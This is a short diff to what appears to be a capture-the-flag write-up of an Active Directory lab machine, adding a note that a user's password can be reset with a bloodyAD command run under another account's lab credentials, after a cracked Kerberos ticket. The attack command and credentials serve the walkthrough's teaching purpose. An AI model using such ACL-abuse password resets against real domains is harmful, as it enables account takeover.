@@ -203,6 +203,12 @@ Candidates.#1....: 271087 -> dyesebel
 Started: Mon Apr 14 16:28:57 2025
 Stopped: Mon Apr 14 16:29:01 2025
 ```
+> [Note] I soon after learned that I actually grabbed a TGS after someone had already changed his password. In any case we can instead just change his password using the command:
+> ```
+> bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p 'ichliebedich' set password michael popopopo
+> [+] Password changed successfully!
+> ```
+
 We found `Michael`'s password: `popopopo`, Looking back at our bloodhound data, we know that `Michael` can forcibly change `Benjamin`'s password.
 ![](/assets/img/img_administrator/administrator-1744587100311.png)
 
